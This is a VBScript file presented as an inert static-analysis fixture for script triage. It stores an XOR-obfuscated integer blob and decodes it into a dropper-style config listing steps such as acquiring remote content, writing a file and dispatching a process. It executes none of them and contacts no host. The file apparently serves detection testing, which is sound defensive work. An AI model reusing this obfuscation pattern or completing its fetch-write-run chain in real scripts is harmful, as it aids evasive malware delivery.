Option Explicit
' Huntress Script Triage -- inert static-analysis fixture (wsh_vbscript_windows)
Const Material_08077a22 = "90|103|86|42|89|45|72|56|75|118|23|116|5|112|25|107|14|81|35|70|43|68|48|85|121|14|124|21|97|4|91|61|84|56|93|113|21|124|15|127|30|106|9|97|62|78|60|83|48|85|38|85|121|17|112|30|122|21|115|21|74|57|90|40|65|49|69|57|88|60|93|45|89|60|78|115|36|77|35|107|31|107|27|53|98|11|101|45|89|45|93|15|106|27|110|11|120|12|34|23|57|8|116|7|115|18|117|16|79|44|67|54|88|44|17|37|89|58|91|54|70|39|78|41|71|24|113|21|40|75|42|71|55|86|63|88|54|27|126|79|127|30|120|26|40|28|45|72|52|65|51|95|98|10|126|10|122|9|51|28|51|86|103|87|54|80|50|0|52|5|96|78|43|83|50|95|47|67|38|8|97|15|121|24|116|29|121|86|111|10|110|15|62|9|56|14|32|68|37|81|45|88|43|78|60|99|2|101|0|110|26|39|111|26|116|0|114|23|100|23|91|58|88|119|18|35|19|114|20|118|68|112|65|36|88|62|87|59|94|1|113|16|100|12|49|114|72|20|65|50|87|37|86|10|90|47|77|33|72|43|119|63|74|36|80|34|71|52|71|11|106|8|84|39|83|50|85|48|29|120|73|121|24|126|28|46|26|43|78|96|4|101|17|109|31|122|29|116|7|115|1|120|39|87|54|66|42|23|95|20|87|2|94|13|98|4|112|7|102|20|113|45|101|16|126|10|120|29|110|29|81|48|82|14|74|35|80|32|79|60|93|63|83|54|106|15|62|14|111|9|107|89|109|92|57|69|43|78|54|66|29|110|26|123|28|121|68|40|71|36|69|41|4|96|9|122|10|107|31|124|20|58|76|46|93"
Const Codec_08077a22 = "decimal_pipe|rolling_xor|2c"

Function Load_08077a22()
  Dim parts, result(), i
  parts = Split(Material_08077a22, "|")
  ReDim result(UBound(parts))
  For i = 0 To UBound(parts)
    result(i) = CInt(parts(i))
  Next
  Load_08077a22 = result
End Function

Function Decode_08077a22(ByRef s)
  Dim result(), i, keyBytes, previous
  ReDim result(UBound(s))
  previous = 44
  For i = 0 To UBound(s)
    result(i) = s(i) Xor previous
    previous = s(i)
  Next
  Decode_08077a22 = result
End Function

Function Recover_08077a22()
  Dim s, d, t, n, i, p, e, q
  ' configuration reconstruction
n = (19 * 7) - 133
  s = Load_08077a22()
  Select Case 1
    Case 1
      d = Decode_08077a22(s)
    Case Else
      d = Array()
  End Select
  t = ""
  For i = 0 To UBound(d)
    t = t & Chr(d(i))
  Next
' reconstruction complete
  Recover_08077a22 = t
End Function

Function Inspect_08077a22()
  Dim fields
  fields = Split(Recover_08077a22(), "|")
  Inspect_08077a22 = Join(fields, "|")
End Function
